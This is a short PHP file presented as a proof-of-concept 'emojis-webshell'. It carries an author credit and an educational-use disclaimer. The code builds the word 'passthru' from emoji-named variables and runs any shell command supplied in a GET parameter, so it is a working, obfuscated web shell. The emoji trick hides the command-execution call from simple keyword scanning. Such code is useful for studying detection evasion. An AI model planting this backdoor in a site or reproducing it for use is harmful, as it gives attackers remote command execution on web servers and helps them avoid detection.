<?php

/*
 * emojis-webshell
 * A Proof of Concept for using Emojis in PHP.
 * Author: Mazin Ahmed <Mazin AT MazinAhmed DOT net>
 * Homepage: https://github.com/mazen160/public/tree/master/Proof-of-Concepts/emojis-webshell
 * License: The MIT License (MIT) - https://github.com/mazen160/public/blob/master/Proof-of-Concepts/emojis-webshell/LICENSE.txt
 *
 * Legal Disclaimer:
 * This project is made for educational and ethical testing purposes only. Usage of project for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
*/

$😀="a";
$😁="b";
$😂="c";
$🤣="d";
$😃="e";
$😄="f";
$😅="g";
$😆="h";
$😉="i";
$😊="j";
$😋="k";
$😎="l";
$😍="m";
$😘="n";
$😗="o";
$😙="p";
$😚="q";
$🙂="r";
$🤗="s";
$🤩="t";
$🤔="u";
$🤨="v";
$😐="w";
$😑="x";
$😶="y";
$🙄="z";

$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;

if (isset($_GET['👽'])) {
  eval($😭($_GET['👽']));
};
